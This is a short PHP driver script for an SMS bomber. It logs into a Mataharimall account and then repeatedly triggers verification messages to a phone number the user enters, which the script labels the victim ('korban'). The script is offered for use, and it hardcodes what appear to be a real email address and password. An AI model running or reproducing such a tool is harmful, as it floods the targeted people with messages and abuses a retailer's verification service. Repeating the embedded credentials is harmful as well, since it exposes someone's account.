<?php
//MADE BY ADITIA ALFIANSYAH
//https://github.com/Aditia18
//GARUDA TERSAKTI CREW
include 'bommthrml.php';
$init = new Bom();
// Konfigurasi Akun Mataharimall
$init->email = "aditiaalfiansyah18@gmail.com";
$init->pass = "FR13ND5";
$init->Login($init->email,$init->pass);
//Eksekusi Sms Boomber
echo "Nomor Korban (pakai 62)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Santet\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}